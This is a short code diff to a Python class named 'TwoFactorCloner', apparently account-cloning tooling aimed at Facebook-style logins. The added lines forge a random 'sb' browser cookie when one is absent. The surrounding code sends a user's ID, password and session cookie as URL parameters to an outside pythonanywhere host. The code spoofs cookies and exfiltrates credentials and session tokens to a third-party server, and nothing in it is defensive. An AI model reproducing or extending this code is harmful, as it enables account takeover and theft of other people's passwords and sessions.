@@ -4,6 +4,7 @@ echo "Written by Ahmed Ali"
 """
 
 import os
+import base64
 import requests
 
 class TwoFactorCloner:
@@ -17,6 +18,11 @@ class TwoFactorCloner:
         self.fail = 0
 
     def AUTO_2F(self, uid, password, cookie):
+        if "sb=" not in cookie:
+            sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+            cookie = f"sb={sb};{cookie}"
+        else:
+            pass
         send_req = requests.get(f"https://livedeadsegs.pythonanywhere.com/TWO_FACTOR?uid={uid}&password={password}&cookie={cookie}").text
         return send_req
 
